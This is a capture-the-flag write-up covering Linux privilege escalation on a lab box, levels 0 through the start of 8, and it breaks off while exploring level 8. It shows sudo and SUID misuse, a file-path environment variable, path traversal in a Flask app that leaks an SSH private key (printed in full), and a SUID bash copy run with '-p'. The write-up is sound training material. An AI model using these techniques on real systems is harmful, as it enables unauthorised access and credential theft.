# Context
It is the MTLHack Holiday CTF!! This track is all about linux privesc.
We are given ssh credentials for user `level0`

## level0:

Okay. "We are in." 
Lets see what this user has in his home directory.
```bash
level0@the-box:~$ ls -lahF
total 64K
drwxr-x--- 1 level0 level0 4.0K Jan 12 01:02 ./
drwxr-xr-x 1 root   root   4.0K Dec 20 08:04 ../
-rw-r--r-- 1 level0 level0  269 Dec 20 19:07 .README
lrwxrwxrwx 1 root   root      9 Jan 12 00:53 .bash_history -> /dev/null
-rw-r--r-- 1 level0 level0  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 level0 level0 3.8K Jan 12 00:53 .bashrc
drwx------ 2 level0 level0 4.0K Jan 12 01:02 .cache/
drwxrwx--- 2 level0 level0 4.0K Jan 12 00:53 .config/
-rw-r--r-- 1 root   root      0 Jan 12 00:53 .hushlogin
drwxrwx--- 2 level0 level0 4.0K Jan 12 00:53 .local/
-rw------- 1 level0 level0   68 Dec 20 17:41 .motd
-rw-r--r-- 1 level0 level0  807 Jan  6  2022 .profile
drwxrwx--- 2 level0 level0 4.0K Jan 12 00:53 .ssh/
drwxrwx--- 2 level0 level0 4.0K Jan 12 00:53 Documents/
drwxrwx--- 2 level0 level0 4.0K Jan 12 00:53 Downloads/
drwxrwx--- 2 level0 level0 4.0K Jan 12 00:53 Music/
drwxrwx--- 2 level0 level0 4.0K Jan 12 00:53 Videos/
```
hmm. `.README` looks interesting
```bash
level0@the-box:~$ cat .README 
You found the hidden file !

You are now logged in as level0.
Your goal is to find a way to become level11 and collect all the flags along the way.


Here is the password for level1 : FLAG{f289cc7d7dfe61d651e809394}

You can use 'su level1' to log into the next level.
```

Well, that was easy. Let's switch user to `level1`

## level1:

Let's try the same thing again!
```bash
level1@the-box:~$ ls -laF
total 56
drwxr-x--- 1 level1 level1 4096 Jan 12 00:53 ./
drwxr-xr-x 1 root   root   4096 Dec 20 08:04 ../
lrwxrwxrwx 1 root   root      9 Jan 12 00:53 .bash_history -> /dev/null
-rw-r--r-- 1 level1 level1  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 level1 level1 3854 Jan 12 00:53 .bashrc
drwxrwx--- 2 level1 level1 4096 Jan 12 00:53 .config/
-rw-r--r-- 1 root   root      0 Jan 12 00:53 .hushlogin
drwxrwx--- 2 level1 level1 4096 Jan 12 00:53 .local/
-rw------- 1 level1 level1   19 Dec 20 17:42 .motd
-rw-r--r-- 1 level1 level1  807 Jan  6  2022 .profile
drwxrwx--- 2 level1 level1 4096 Jan 12 00:53 .ssh/
drwxrwx--- 2 level1 level1 4096 Jan 12 00:53 Documents/
drwxrwx--- 2 level1 level1 4096 Jan 12 00:53 Downloads/
drwxrwx--- 2 level1 level1 4096 Jan 12 00:53 Music/
drwxrwx--- 2 level1 level1 4096 Jan 12 00:53 Videos/
```

Obviously it didn't give us the flag. Let's see what permissions the user has.
```bash
level1@the-box:~$ sudo -l
Matching Defaults entries for level1 on the-box:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User level1 may run the following commands on the-box:
    (root) NOPASSWD: /usr/bin/su level2

```
Nice. `sudo su level2`

## level2:

```bash
Simple read through binary
```

You know the drill. Let's explore the home directory.
```bash
level2@the-box:~$ ls -laF         
total 60
drwxr-x--- 1 level2 level2 4096 Jan 12 00:53 ./
drwxr-xr-x 1 root   root   4096 Dec 20 08:04 ../
lrwxrwxrwx 1 root   root      9 Jan 12 00:53 .bash_history -> /dev/null
-rw-r--r-- 1 level2 level2  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 level2 level2 3882 Jan 12 00:53 .bashrc
drwxrwx--- 2 level2 level2 4096 Jan 12 00:53 .config/
-rw-r--r-- 1 root   root      0 Jan 12 00:53 .hushlogin
drwxrwx--- 2 level2 level2 4096 Jan 12 00:53 .local/
-rw------- 1 level2 level2   27 Dec 18 05:29 .motd
-rw-r--r-- 1 level2 level2  807 Jan  6  2022 .profile
drwxrwx--- 2 level2 level2 4096 Jan 12 00:53 .ssh/
drwxrwx--- 2 level2 level2 4096 Jan 12 00:53 Documents/
drwxrwx--- 2 level2 level2 4096 Jan 12 00:53 Downloads/
drwxrwx--- 2 level2 level2 4096 Jan 12 00:53 Music/
drwxrwx--- 2 level2 level2 4096 Jan 12 00:53 Videos/
drwxr-xr-x 1 level3 level3 4096 Dec 20 19:08 programs/
```
We haven't seen a `programs` directory before, let's explore it.
```bash
level2@the-box:~$ ls -laF programs
total 28
drwxr-xr-x 1 level3 level3  4096 Dec 20 19:08 ./
drwxr-x--- 1 level2 level2  4096 Jan 12 00:53 ../
-rws--x--- 1 level3 level2 16424 Dec 20 19:08 get_next_flag*
```

Is that what I think it is?
```bash
level2@the-box:~$ ./programs/get_next_flag 
content of this file are 
FLAG{8db86a6010012f1adb808e499}
```

## level3:

```bash
level3@the-box:~$ ls -laF
total 52
drwxr-x--- 1 level3 level3 4096 Jan 12 00:53 ./
drwxr-xr-x 1 root   root   4096 Dec 20 08:04 ../
lrwxrwxrwx 1 root   root      9 Jan 12 00:53 .bash_history -> /dev/null
-rw-r--r-- 1 level3 level3  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 level3 level3 3854 Jan 12 00:53 .bashrc
drwxrwx--- 2 level3 level3 4096 Jan 12 00:53 .config/
-rw-r--r-- 1 root   root      0 Jan 12 00:53 .hushlogin
drwxr-xr-x 1 root   root   4096 Dec 20 19:08 .local/
-rw------- 1 level3 level3    0 Dec 20 05:56 .motd
-rw-r--r-- 1 level3 level3  807 Jan  6  2022 .profile
drwxrwx--- 2 level3 level3 4096 Jan 12 00:53 .ssh/
drwxr-xr-x 1 level3 level3 4096 Dec 20 19:08 Documents/
drwxrwx--- 2 level3 level3 4096 Jan 12 00:53 Downloads/
drwxrwx--- 2 level3 level3 4096 Jan 12 00:53 Music/
drwxrwx--- 2 level3 level3 4096 Jan 12 00:53 Videos/
```

```bash
level3@the-box:~$ sudo -l
Matching Defaults entries for level3 on the-box:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User level3 may run the following commands on the-box:
    (level4) NOPASSWD: /home/level3/.local/bin/get_next_flag
```

Oh, we have execute privs on something interesting!
```bash
level3@the-box:~$ ls -lahF /home/level3/.local/bin/get_next_flag 
-rwx--x--- 1 level3 level3 16K Dec 20 19:08 /home/level3/.local/bin/get_next_flag*
```

Let's try it out!
```bash
level3@the-box:~$ /home/level3/.local/bin/get_next_flag
file can't be opened 
This looks interesting :
Segmentation fault (core dumped)
```

Oh... What is this program?
```bash
level3@the-box:~$ cat /home/level3/.local/bin/get_next_flag
@@@@�����   ,,�-�=�=���-�=�=�8880hhhDDS�td8880P�tdH H H 44Q�tdR�td�-�=�=xx/lib64/ld-linux-x86-64.so.2 GNU���GNUE����w:[٢��+��K}��GNU
                                                                �
                                                                 �e�mB� 5.J� (:� "fgetc__cxa_finalize__libc_start_mainfopenfcloseputssprintfputchar__stack_chk_faillibc.so.6GLIBC_2.4GLIBC_2.34GLIBC_2.2.5_Ie���ou�iisterTMCz�@�?�?��?_gmon_start___ITM_registerTMCloneTable[ii
                          �?
                            �?�?�?�?�?�?	�?
��H�H��/H��t��H���5j/��%k/��h���������h���������h���������h��������h��������h��������h����������%M/D����%�.D����%�.D����%�.D����%�.D����%�.D����%�.D����%�.D��1�I��^H��H���PTE1�1�H�=���.�f.�H�=�.H��.H9�tH�v.H��t	�����H�=�.H�5�.H)�H��H��?H��H�H��tH�E.H����fD�����=E.u+UH�=".H��t
H���3���H������H���T����������������������������u�H������H������H�U�dH+%(t���������H�H��/f/l/a/g/s/level4rfile can't be opened This looks interesting :4����hX����h��������P�����zRx
                                           ����&D$4h����FJ
                                                          �?�:*3$"\����t����p������E�C
�[
;�������o��
�
 �?��� ������o����o���o����o�=0@P`p�@GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0��	� ��P �3�I�@U�=|��=������(!����=�H ��?�
                                                       ( � @DU@\o�u��@� @� ��@� &��@�	��@" <"W
                                Scrt1.o__abi_tagcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryget_next_flag.c__FRAME_END___DYNAMIC__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE_putchar@GLIBC_2.2.5__libc_start_main@GLIBC_2.34_ITM_deregisterTMCloneTableputs@GLIBC_2.2.5_edatafclose@GLIBC_2.2.5_fini__stack_chk_fail@GLIBC_2.4fgetc@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used_end__bss_startmainfopen@GLIBC_2.2.5sprintf@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTable__cxa_finalize@GLIBC_2.2.5_init.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment#886hh$I�� W���o��a
                                                        ��i�q���o����  G�H H 4�� � ������=�-��?�@0��
                            @00+@0�     04]�6�
```
`/f/l/a/g/s/level4`
Oh. What is this file?!
```bash
level3@the-box:~$ cd /f/l/a/g/s
level3@the-box:/f/l/a/g/s$ ls -laF
total 52
drwxr-xr-x 1 root    root    4096 Jan 12 00:53 ./
drwxr-xr-x 1 root    root    4096 Dec 20 19:07 ../
-rw------- 1 level0  level0    18 Jan 12 00:53 level0
-rw------- 1 level1  level1    32 Jan 12 00:53 level1
-rw------- 1 level10 level10   32 Jan 12 00:53 level10
-rw------- 1 level2  level2    32 Jan 12 00:53 level2
-rw------- 1 level3  level3    32 Jan 12 00:53 level3
-rw------- 1 level4  level4    32 Jan 12 00:53 level4
-rw------- 1 level5  level5    32 Jan 12 00:53 level5
-rw------- 1 level6  level6    32 Jan 12 00:53 level6
-rw------- 1 level7  level7    32 Jan 12 00:53 level7
-rw------- 1 level8  level8    32 Jan 12 00:53 level8
-rw------- 1 level9  level9    32 Jan 12 00:53 level9
```

Cool, we should keep this in mind.

Meanwhile, we should try the sudo priv
```bash
level3@the-box:/f/l/a/g/s$ sudo -u level4 /home/level3/.local/bin/get_next_flag
This looks interesting :
FLAG{84f1e43fc943d14537447580d}
```

## level4:

`Simple read through binary`

```bash
level4@the-box:~$ ls -laF programs
total 28
drwxr-xr-x 1 level4 level4  4096 Dec 20 19:08 ./
drwxr-x--- 1 level4 level4  4096 Jan 12 00:53 ../
-rwsr-x--- 1 level5 level4 16464 Dec 20 19:08 read_file*
```

```bash
level4@the-box:~$ sudo -l
[sudo] password for level4: 
Sorry, user level4 may not run sudo on the-box.
```

```bash
level4@the-box:~$ ./programs/read_file 
Reading file : /opt/level4/bears.txt

There are eight bear species, each with its own unique characteristics. Here's a brief overview of each:

1. Polar Bear (Ursus maritimus):
[...]
```

`level4@the-box:~$ ./programs/read_file test`
`echo 'test' > test; ./programs/read_file < test`
Same results... Hmmm...
How does this command work anyway. Environment variable maybe?
```bash
level4@the-box:~$ export | grep bears
declare -x READER_FILEPATH="/opt/level4/bears.txt"
```

```bash
level4@the-box:~$ READER_FILEPATH="/f/l/a/g/s/level5"
level4@the-box:~$ ./programs/read_file
Reading file : /f/l/a/g/s/level5
FLAG{4f54ae08425a089f0aae0fa6e}
```

## level5:

```bash
level5@the-box:~$ ls -laF
total 56
drwxr-x--- 1 level5 level5 4096 Feb 10 00:25 ./
drwxr-xr-x 1 root   root   4096 Dec 20 08:04 ../
lrwxrwxrwx 1 root   root      9 Jan 12 00:53 .bash_history -> /dev/null
-rw-r--r-- 1 level5 level5  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 level5 level5 3854 Jan 12 00:53 .bashrc
drwx------ 2 level5 level5 4096 Feb 10 00:25 .cache/
drwxrwx--- 2 level5 level5 4096 Jan 12 00:53 .config/
-rw-r--r-- 1 root   root      0 Jan 12 00:53 .hushlogin
drwxrwx--- 2 level5 level5 4096 Jan 12 00:53 .local/
-rw------- 1 level5 level5    0 Dec 20 05:56 .motd
-rw-r--r-- 1 level5 level5  807 Jan  6  2022 .profile
drwxrwx--- 2 level5 level5 4096 Jan 12 00:53 .ssh/
drwxrwx--- 2 level5 level5 4096 Jan 12 00:53 Documents/
drwxrwx--- 2 level5 level5 4096 Jan 12 00:53 Downloads/
drwxrwx--- 2 level5 level5 4096 Jan 12 00:53 Music/
drwxrwx--- 2 level5 level5 4096 Jan 12 00:53 Videos/
```

```bash
level5@the-box:~$ sudo -l
[sudo] password for level5: 
Sorry, user level5 may not run sudo on the-box.
```

Not much to go off of, but let's keep digging.
```bash
level5@the-box:~$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2888   520 pts/0    Ss+  Jan12   0:18 /bin/sh -c echo "Starting SSH server" &&            echo "CTRL+C to st
root          18  0.0  0.1   3884  1680 ?        Ss   Jan12   0:24 /usr/sbin/cron -P
root          22  0.0  0.7  15428  7008 pts/0    S+   Jan12   6:35 sshd: /usr/sbin/sshd -D [listener] 4 of 10-100 startups
root          30  0.0  0.2   4168  2000 ?        Ss   Jan12   0:00 SCREEN -d -m bash -c cd /opt/report_viewer_webapp && sudo -H -u level6
root          31  0.0  0.2   7240  2576 pts/1    Ss+  Jan12   0:00 sudo -H -u level6 flask run --host=0.0.0.0
root          32  0.0  0.0   7240   564 pts/2    Ss   Jan12   0:00 sudo -H -u level6 flask run --host=0.0.0.0
level6        33  0.0  2.6 257300 25560 pts/2    S+   Jan12   8:37 /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0
root     1172049  0.0  0.9  15916  9772 ?        Ss   18:17   0:00 sshd: level0 [priv]
level0   1172069  0.0  0.7  16176  7112 ?        S    18:18   0:00 sshd: level0@pts/3
level0   1172070  0.0  0.3   4624  3768 pts/3    Ss   18:18   0:00 -bash
root     1172160  0.0  0.3   6212  3624 pts/3    S    18:21   0:00 su level1
level1   1172161  0.0  0.3   4624  3636 pts/3    S    18:21   0:00 bash
root     1172192  0.0  0.4   7240  4272 pts/3    S+   18:22   0:00 sudo su level2
root     1172193  0.0  0.0   7240   564 pts/4    Ss   18:22   0:00 sudo su level2
root     1172194  0.0  0.3   6212  3356 pts/4    S    18:22   0:00 su level2
level2   1172195  0.0  0.3   4624  3712 pts/4    S    18:22   0:00 bash
root     1172293  0.0  0.3   6212  3652 pts/4    S    18:26   0:00 su level3
level3   1172294  0.0  0.3   4624  3652 pts/4    S    18:26   0:00 bash
root     1172827  0.0  0.3   6212  3664 pts/4    S    18:45   0:00 su level4
level4   1172828  0.0  0.3   4624  3780 pts/4    S    18:45   0:00 bash
root     1173105  0.0  0.3   6212  3628 pts/4    S    18:53   0:00 su level5
level5   1173108  0.0  0.3   4624  3760 pts/4    S    18:53   0:00 bash
root     1173189  0.0  0.8  15428  8468 ?        Ss   18:55   0:00 sshd: [accepted]
sshd     1173190  0.0  0.5  15428  5432 ?        S    18:55   0:00 sshd: [net]
root     1173244  0.5  0.9  15796  9428 ?        Ss   18:56   0:00 sshd: unknown [priv]
sshd     1173245  0.0  0.5  15428  5428 ?        S    18:56   0:00 sshd: unknown [net]
root     1173246  2.0  0.9  15796  9428 ?        Ss   18:56   0:00 sshd: unknown [priv]
sshd     1173247  0.0  0.5  15428  5488 ?        S    18:56   0:00 sshd: unknown [net]
root     1173248  1.0  0.9  15796  9456 ?        Ss   18:56   0:00 sshd: unknown [priv]
sshd     1173249  0.0  0.5  15428  5524 ?        S    18:56   0:00 sshd: unknown [net]
level5   1173250  0.0  0.1   7060  1616 pts/4    R+   18:56   0:00 ps -aux
```
(This was taken after the ctf, but there were way more `ssh`, `su` and `bash` processes during the event.)
Let's filter this output.
```bash
level5@the-box:~$ ps -aux | grep -v 'su level.' | grep -v -F 'ssh'
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          18  0.0  0.1   3884  1680 ?        Ss   Jan12   0:24 /usr/sbin/cron -P
root          30  0.0  0.2   4168  2000 ?        Ss   Jan12   0:00 SCREEN -d -m bash -c cd /opt/report_viewer_webapp && sudo -H -u level6 flask run --host=0.0.0.0
root          31  0.0  0.2   7240  2576 pts/1    Ss+  Jan12   0:00 sudo -H -u level6 flask run --host=0.0.0.0
root          32  0.0  0.0   7240   564 pts/2    Ss   Jan12   0:00 sudo -H -u level6 flask run --host=0.0.0.0
level6        33  0.0  2.6 257300 25560 pts/2    S+   Jan12   8:37 /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0
level0   1172070  0.0  0.3   4624  3768 pts/3    Ss   18:18   0:00 -bash
level1   1172161  0.0  0.3   4624  3636 pts/3    S    18:21   0:00 bash
level2   1172195  0.0  0.3   4624  3712 pts/4    S    18:22   0:00 bash
level3   1172294  0.0  0.3   4624  3652 pts/4    S    18:26   0:00 bash
level4   1172828  0.0  0.3   4624  3780 pts/4    S    18:45   0:00 bash
level5   1173108  0.0  0.3   4624  3760 pts/4    S    18:53   0:00 bash
level5   1173338  0.0  0.1   7060  1552 pts/4    R+   18:59   0:00 ps -aux
```

Flask server running, therefore try `ss`
```bash
level5@the-box:~$ ss -altnup
bash: ss: command not found
```

boo, oldschool it is.
```bash
level5@the-box:~$ netstat -nl   
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     12549090 /run/screen/S-root/30..the-box
```

Let's probe that port 5000.
```bash
nc box1.j3romee.com 5000
```

exited, firewalled? let's try port forwarding
```bash
ssh -L 5000:localhost:5000 level0@box1.j3romee.com
firefox localhost:5000&
```

After playing around with the website, we can see that the url has an SQL input field
(`http://localhost:5000/diary?day=2`)
Let's try to get the level6 flag since the program is running under that user.

```
localhost:5000/diary?day=../../../f/l/a/g/s/level6

Nice try but you can't read this file.
```
pain
After going down a whole rabbit hole of webapp bypass and encoding, I realised that the program probably has access to the actual machine itself. Instead of getting the flag directly, what if...

```
localhost:5000/diary?day=../../../home/level6/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----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
-----END OPENSSH PRIVATE KEY-----


##########################################################################
../../../../home/level6/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH2aQnCI7/m4V1aSaBunu/Dxaksdaop5orys6Y3pWUjDZP5t1UgTr6TYewkfZ9TghT1l4lrHKKbJa8Pi/gTtSHo93y5BbnFamioWqcrCsvWWh3qqPy5m7rMnEqJj50/vTfi4snI8s79z3ZVrPuFwwNEK/v4igw39zmxra/K6MX2CxwS6/x2lQw2XD2iU6JYsWXHkrIbr4JC/71MXt6QHC3MRJNIT6skKgZMHTWkzVkCsMk2Ev9qvqRlJRWyozSNzXAfr2oNRgRyB1S3Cu1qN925vbzaNqa6RqifsVSOcZCNBO9nizq+YhRTCTJjeYevOle8NUSzi6n9mWKrzmZbN3Ew6SYZFQGZL9aiEWdA6ZOqWDZY8TeymDVTONBu8gYzNTpku1IkKZpmlJa0VSR2zJNJwgBRfnFp8nDxpiX+FDaPKeVk4M5WRvqvI7kLXiNra/9VPhWyZoFtOFViVs/eSF3tfrsnq+3J1ujCQnQI7M1U2BHM/47dib/a9qjJW2IB20= level6@buildkitsandbox

##########################################################################
http://localhost:5000/diary?day=../../../../home/level6/.ssh/id_rsa.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH2aQnCI7/m4V1aSaBunu/Dxaksdaop5orys6Y3pWUjDZP5t1UgTr6TYewkfZ9TghT1l4lrHKKbJa8Pi/gTtSHo93y5BbnFamioWqcrCsvWWh3qqPy5m7rMnEqJj50/vTfi4snI8s79z3ZVrPuFwwNEK/v4igw39zmxra/K6MX2CxwS6/x2lQw2XD2iU6JYsWXHkrIbr4JC/71MXt6QHC3MRJNIT6skKgZMHTWkzVkCsMk2Ev9qvqRlJRWyozSNzXAfr2oNRgRyB1S3Cu1qN925vbzaNqa6RqifsVSOcZCNBO9nizq+YhRTCTJjeYevOle8NUSzi6n9mWKrzmZbN3Ew6SYZFQGZL9aiEWdA6ZOqWDZY8TeymDVTONBu8gYzNTpku1IkKZpmlJa0VSR2zJNJwgBRfnFp8nDxpiX+FDaPKeVk4M5WRvqvI7kLXiNra/9VPhWyZoFtOFViVs/eSF3tfrsnq+3J1ujCQnQI7M1U2BHM/47dib/a9qjJW2IB20= level6@buildkitsandbox
```

Nice, new credentials.
```bash
chmod 0600 id_rsa
ssh -i id_rsa level6@box1.j3romee.com
```
`FLAG{f3908f294811aa50420f54084}`

## level6:

`Can you trick the oracle ?`

```bash 
level6@the-box:~$ find -name oracle -type f
./Desktop/oracle

level6@the-box:~$ ls -l Desktop/oracle 
-rwxr-xr-x 1 level6 level6 16184 Dec 20 19:08 Desktop/oracle
```

run strings lmao:
```bash
level6@the-box:~$ strings Desktop/oracle | grep FLAG
How cool is this : FLAG{1bc650e0a9bc47f0b6bde2407}
```

## level7:

```bash 
level7@the-box:~$ ls -laF
total 52
drwxr-x--- 1 level7 level7 4096 Jan 12 00:53 ./
drwxr-xr-x 1 root   root   4096 Dec 20 08:04 ../
lrwxrwxrwx 1 root   root      9 Jan 12 00:53 .bash_history -> /dev/null
-rw-r--r-- 1 level7 level7  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 level7 level7 3854 Jan 12 00:53 .bashrc
drwxrwx--- 2 level7 level7 4096 Jan 12 00:53 .config/
-rw-r--r-- 1 root   root      0 Jan 12 00:53 .hushlogin
drwxrwx--- 2 level7 level7 4096 Jan 12 00:53 .local/
-rw------- 1 level7 level7    0 Dec 20 05:56 .motd
-rw-r--r-- 1 level7 level7  807 Jan  6  2022 .profile
drwxrwx--- 2 level7 level7 4096 Jan 12 00:53 .ssh/
drwxrwx--- 2 level7 level7 4096 Jan 12 00:53 Documents/
drwxrwx--- 2 level7 level7 4096 Jan 12 00:53 Downloads/
drwxrwx--- 2 level7 level7 4096 Jan 12 00:53 Music/
drwxrwx--- 2 level7 level7 4096 Jan 12 00:53 Videos/
```

```bash
level7@the-box:~$ sudo -l
[sudo] password for level7: 
Sorry, user level7 may not run sudo on the-box.
```

```bash
level7@the-box:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
/usr/bin/thebash
/usr/bin/sudo
```

Interesting, `thebash` you say?
```bash
level7@the-box:~$ diff /usr/bin/thebash /bin/bash 
diff: /usr/bin/thebash: Permission denied
level7@the-box:~$ ls -l /usr/bin/thebash
-rws--x--- 1 level8 level7 1396520 Dec 21 00:43 /usr/bin/thebash
```

Let's assume this `thebash` is in fact a copy of `bash`. GTFObins should help out:
[SUID](https://gtfobins.github.io/gtfobins/bash/#suid)

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

 ```
    sudo install -m =xs $(which bash) .
    
    ./bash -p
```

So:
```bash
level7@the-box:~$ thebash -p
thebash-5.1$ cat /f/l/a/g/s/level8
FLAG{43850d574c8873722e4f641b7}
```

## level8:

```bash
level8@the-box:~$ ls -laF
total 52
drwxr-x--- 1 level8 level8 4096 Jan 12 00:53 ./
drwxr-xr-x 1 root   root   4096 Dec 20 08:04 ../
lrwxrwxrwx 1 root   root      9 Jan 12 00:53 .bash_history -> /dev/null
-rw-r--r-- 1 level8 level8  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 level8 level8 3854 Jan 12 00:53 .bashrc
drwxrwx--- 2 level8 level8 4096 Jan 12 00:53 .config/
-rw-r--r-- 1 root   root      0 Jan 12 00:53 .hushlogin
drwxrwx--- 2 level8 level8 4096 Jan 12 00:53 .local/
-rw------- 1 level8 level8    0 Dec 20 05:56 .motd
-rw-r--r-- 1 level8 level8  807 Jan  6  2022 .profile
drwxrwx--- 2 level8 level8 4096 Jan 12 00:53 .ssh/
drwxrwx--- 2 level8 level8 4096 Jan 12 00:53 Documents/
drwxrwx--- 2 level8 level8 4096 Jan 12 00:53 Downloads/
drwxrwx--- 2 level8 level8 4096 Jan 12 00:53 Music/
